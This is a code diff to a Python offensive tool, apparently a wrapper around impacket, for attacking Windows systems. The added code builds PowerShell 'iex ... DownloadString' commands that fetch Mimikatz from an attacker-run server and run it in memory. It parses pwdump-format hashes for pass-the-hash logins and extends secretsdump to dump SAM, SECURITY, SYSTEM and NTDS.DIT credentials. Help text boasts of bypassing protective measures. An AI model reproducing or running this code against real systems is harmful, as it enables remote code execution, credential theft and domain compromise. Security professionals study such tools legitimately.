@@ -83,6 +83,18 @@ class Obfiscator:
             print("[!] There was an error %s") % (str(e))
             sys.exit(1)
 
+    def invoker(self):
+        # Invoke Mimikatz Directly
+        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://system_ip:src_port/payload'); function -argument
+        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+        self.command = self.packager(text)
+
+    def downloader(self):
+        # Download String Directly
+        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://system_ip:src_port/payload')
+        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s')" % (str(self.src_ip), str(self.src_port), str(self.payload))
+        self.command = self.packager(text)
+
 def get_interfaces():
     interfaces = netifaces.interfaces()
     return interfaces
@@ -121,17 +133,40 @@ def get_networks(gateways_dict):
         networks_dict[iface] = network
     return networks_dict
 
+def hash_test(LM, NTLM, pwd):
+    print("[*] Hash detected")
+    blank_ntlm = re.search(r'31d6cfe0d16ae931b73c59d7e0c089c0',NTLM, re.IGNORECASE)
+    blank_lm = re.search(r'aad3b435b51404eeaad3b435b51404ee',LM, re.IGNORECASE)
+    blank_lm_instances = len(re.findall(r'aad3b435b51404ee', LM, re.IGNORECASE))
+    bad_format = re.search(r'NOPASSWORD',LM, re.IGNORECASE)
+    if bad_format:
+        print("[*] The hash was badly formatted, so padding it")
+        LM = "aad3b435b51404eeaad3b435b51404ee"
+    if blank_lm and blank_ntlm:
+        print("[*] You do know this password is blank right?")
+    elif blank_lm_instances == 1 and not blank_lm:
+        print("[*] The hashed password is less than eight characters")
+    elif blank_lm and blank_ntlm:
+        print("[*] LM hashes are disabled, so focus on cracking the NTLM")
+    hash = LM + ":" + NTLM
+    print("[*] Your formated hash is: %s") % (hash)
+    pwd = ""
+    return(LM, NTLM, pwd)
+
+
 def main():
     # If script is executed at the CLI
     usage = '''usage: %(prog)s [-s IP] [-r port] [-x payload.ps1] [-a argument] [-f function] [-c interface] -i -d  -q -v -vv -vvv'''
     parser = argparse.ArgumentParser(usage=usage, description="A wrapping and execution tool for a some of the most useful impacket tools", epilog="This script oombines specific attacks with dynmaic methods, which allow you to bypass many protective measures.")
     group1 = parser.add_argument_group('Method')
     group2 = parser.add_argument_group('Attack')
+    group3 = parser.add_argument_group('SAM and NTDS.DIT Options, used with --sam_dump')
     iex_options = parser.add_argument_group('PowerShell IEX Options')
     remote_attack = parser.add_argument_group('Remote Target Options')
     generator = parser.add_argument_group('Filename for randimization of script')
     method = group1.add_mutually_exclusive_group()
     attack = group2.add_mutually_exclusive_group()
+    sam_dump_options = group3.add_mutually_exclusive_group()
     iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
     iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
     iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
@@ -144,7 +179,7 @@ def main():
     attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
     remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
     remote_attack.add_argument("--domain", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
-    remote_attack.add_argument("--user", action="store", dest="usr", default="Administrator", help="The username that will be used to exploit the system, defaults to administrator")
+    remote_attack.add_argument("--user", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
     remote_attack.add_argument("--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
     method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
     method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
@@ -157,6 +192,10 @@ def main():
     remote_attack.add_argument('--mode', action="store", dest="mode", choices={"SERVER","SHARE"}, default="SHARE", help="Mode to use for --smbexec, default is SHARE, the other option is SERVER, which requires root access")
     remote_attack.add_argument("--protocol", action="store", dest="protocol", choices={"445/SMB","139/SMB"}, default="445/SMB", help="The protocol to attack over, the default is 445/SMB")
     remote_attack.add_argument("--directory", action="store", dest="directory", default="C:\\", help="The directory to either drop the payload or instantiate the session")
+    sam_dump_options.add_argument("--system", action="store", help="The SYSTEM hive to parse")
+    sam_dump_options.add_argument("--security", action="store", help="The SECURITY hive to parse")
+    sam_dump_options.add_argument("--sam", action="store", help="The SAM hive to parse")
+    sam_dump_options.add_argument("--ntds", action="store", help="The NTDS.DIT file to parse")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
@@ -194,6 +233,12 @@ def main():
     filename = args.filename
     sam_dump = args.sam_dump
     mode = args.mode
+    system = args.system
+    security = args.security
+    sam = args.sam
+    ntds = args.ntds
+    LM = ""
+    NTLM = ""
     no_output = False
     execution = ""
     supplement = ""
@@ -213,7 +258,15 @@ def main():
         print("[!] This script requires either a command, an invoker attack, or a downloader attack")
         parser.print_help()
         sys.exit(1)
-
+    if pwd and ":" in pwd and pwd.count(':') == 6:
+        pwdump_format_hash = pwd.split(':')
+        if not usr:
+            usr = pwdump_format_hash[0]
+        SID = pwdump_format_hash[1]
+        LM = pwdump_format_hash[2]
+        NTLM = pwdump_format_hash[3]
+    if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
+        hash_test(LM, NTLM, pwd)
     if pwd and ":" in pwd and pwd.count(':') == 1:
         if pwd.startswith(':'):
             LM, NTLM = pwd.split(':')
@@ -222,23 +275,7 @@ def main():
         else:
             LM, NTLM = pwd.split(':')
         if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
-            print("[*] Hash detected")
-            blank_ntlm = re.search(r'31d6cfe0d16ae931b73c59d7e0c089c0',NTLM, re.IGNORECASE)
-            blank_lm = re.search(r'aad3b435b51404eeaad3b435b51404ee',LM, re.IGNORECASE)
-            blank_lm_instances = len(re.findall(r'aad3b435b51404ee', LM, re.IGNORECASE))
-            bad_format = re.search(r'NOPASSWORD',LM, re.IGNORECASE)
-            if bad_format:
-                print("[*] The hash was badly formatted, so padding it")
-                LM = "aad3b435b51404eeaad3b435b51404ee"
-            if blank_lm and blank_ntlm:
-                print("[*] You do know this password is blank right?")
-            elif blank_lm_instances == 1 and not blank_lm:
-                print("[*] The hashed password is less than eight characters")
-            elif blank_lm and blank_ntlm:
-                print("[*] LM hashes are disabled, so focus on cracking the NTLM")
-            hash = LM + ":" + NTLM
-            print("[*] Your formated hash is: %s") % (hash)
-            pwd = ""
+            LM, NTLM, pwd =hash_test(LM, NTLM, pwd)
 
     if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd:
         if usr == None or pwd == None:
@@ -302,7 +339,7 @@ def main():
         attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
         attack.play(target)
     elif sam_dump:
-        attack=secretsdump.DumpSecrets(address = target, username = usr, password = pwd, domain = dom, hashes = hash)
+        attack=secretsdump.DumpSecrets(address = target, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
         try:
             attack.dump()
         except Execption as e:
